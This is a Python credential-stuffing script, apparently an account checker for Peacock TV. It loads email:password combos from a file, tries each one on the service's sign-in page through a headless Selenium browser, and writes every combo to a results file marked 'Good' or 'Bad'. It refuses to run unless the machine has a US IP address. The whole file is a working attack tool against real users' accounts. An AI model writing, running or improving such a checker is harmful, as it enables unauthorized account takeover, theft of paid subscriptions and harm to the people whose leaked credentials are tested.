import time
import requests
from bs4 import BeautifulSoup as soup
from peacock_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

header()
file_directory = str(Path(__file__).parent)+'/peacock'
page = 'https://www.peacocktv.com/signin'
get_current_ip = 'https://www.iplocation.net/'
info_list =[]
request = requests.get(get_current_ip)
parse_request = soup(request.content,'html.parser')
get_Location = parse_request.find('table',attrs={'class':'iptable'})
location = get_Location.find_all('td')
for line in location:
	info_list.append(line.text.strip())
if 'US' not in info_list[2]:
	print('Non-US IP\nThe Program will only work for US IP Adresses.\nEnding.')
	exit()

users = []
passwords = []
user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36'
browser_options = Options()
browser_options.headless = True
browser_options.add_argument = ('user-agent={user_agent}')


with open(file_directory, 'r') as peacock:
	
	for line in peacock.readlines():
		users.append(line.split(':')[0].strip())
		passwords.append(line.split(':')[1].strip())

for index in range(len(users)):

	with open('account_results','a') as account_results:
	
		try:
			print('\rTesting Account {} of {} Total Combos'.format(str(index),str(len(users))),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(2)
			email_box = browser.find_element_by_xpath('//*[@id="userIdentifier"]')
			email_box.send_keys(users[index])
			password_box = browser.find_element_by_xpath('//*[@id="password"]')
			password_box .send_keys(passwords[index])
			log_in = browser.find_element_by_xpath('//*[@id="root"]/div/main/div/div[2]/div/div/div/form/div[5]/button')
			log_in.click()
			time.sleep(4)
			invalid_email_text = browser.find_element_by_xpath('//*[@id="notification-error"]/div')
			error = invalid_email_text.text
			if "We didn't recognize" in str(error):
				account_results.write(users[index]+':'+passwords[index]+' ---> Bad \n')
			browser.close()
			
		except NoSuchElementException:

			account_results.write(users[index]+':'+passwords[index]+' ---> Good \n')
			browser.close()
			continue
			
		except ElementClickInterceptedException:
		
			print('Intercepted, ending.\n')
			print('(stopped at combo {}) \n'.format(users[index], passwords[index]))
			break
			
		except Exception as e:
		
			print(e)
			print('(stopped at combo {}) \n'.format(users[index], passwords[index]))
			break
